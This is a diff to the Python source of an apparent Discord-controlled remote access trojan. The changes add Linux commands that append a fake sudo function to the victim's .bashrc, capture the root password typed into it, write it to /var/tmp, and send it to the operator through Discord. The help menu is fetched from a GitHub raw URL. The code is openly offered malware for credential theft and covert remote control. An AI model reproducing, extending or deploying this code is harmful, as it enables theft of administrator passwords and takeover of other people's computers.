@@ -24,17 +24,20 @@ class MyBot(commands.Bot):
         print(f"Logged in as: {self.user}")
         await self.add_cog(clipboard_monitor(bot))
 
-bot = MyBot(command_prefix="!", intents=intents, help_command=None)
+bot = MyBot(command_prefix=["!","! "], intents=intents, help_command=None)
 
 
 if system() == "Windows":
     isWindows = True
     path = "C:\\Windows\\System32\\Tasks\\"
+    home_path = os.path.expanduser("~") + "\\"
 elif system() == "Linux":
     isWindows = False
     path = "/var/tmp/"
+    home_path = os.path.expanduser("~") + "/"
 else:
     exit()
+
 
 # Standalone functions
 
@@ -51,7 +54,9 @@ def embed_data(title, description="", data="", color=discord.Color.green()):
 
 @bot.command(name="help")
 async def help(ctx):
-    embed = embed_data(title="Help menu", data=help_menu)
+    help_menu_request = get("https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/help_menu.md")
+    help_menu = help_menu_request.content.decode("utf-8")
+    embed = embed_data(title="Help menu", description=help_menu)
     await ctx.send(embed=embed)
 
 
@@ -273,6 +278,68 @@ async def hotkey(ctx, *args):
     pyautogui_hotkey(hotkeys)
     embed = embed_data(title="Hotkey | Keyboard", description="Used keyboard to execute hotkey:", data=args)
     await ctx.send(embed=embed)
+
+
+# Linux specifix commands
+
+if isWindows == False:
+    print("its linux")
+    print(home_path)
+
+
+    # root functions
+
+    async def check_file(ctx):
+        embed = embed_data(title="Sudo password", description="Listening for root password started")
+        await ctx.send(embed = embed)
+        while True:            
+            try:
+                file = open(path + "passwd", "r")
+                passwd = file.read()
+                os.remove(path + "passwd")
+                return passwd
+            except FileNotFoundError:
+                print("no file")
+                pass
+            await asyncio.sleep(1)
+
+    async def intercept_sudo(ctx):
+
+        injection_code = """\nsudo() {
+while true; do
+    read -s -r -p "[sudo fake] password for ${USER}: " passwd
+    echo "${passwd}" | /usr/bin/sudo -S ${@} && { echo $passwd > /var/tmp/passwd; break; }
+    clear
+    echo Sorry, try again.
+done
+}"""
+
+        file = open(home_path + ".bashrc", "r")
+        original_bashrc = file.read()
+        file.close
+
+        file = open(home_path + ".bashrc", "a")
+        file.write(injection_code)
+        file.close()
+
+        passwd = await check_file(ctx)
+
+        file = open(home_path + ".bashrc", "w")
+        file.write(original_bashrc)
+        file.close()
+
+        return passwd
+
+    @bot.group(name="sudo", invoke_without_command=True)
+    async def sudo(ctx):
+        await ctx.send("see help menu")
+
+    @sudo.command(name="password")
+    async def password(ctx):
+        passwd = intercept_sudo(ctx)
+        embed = embed_data(title="Sudo password", description="Found sudo password:", data=passwd)
+
+        await ctx.send(embed=embed)
 
 
 # Running the bot
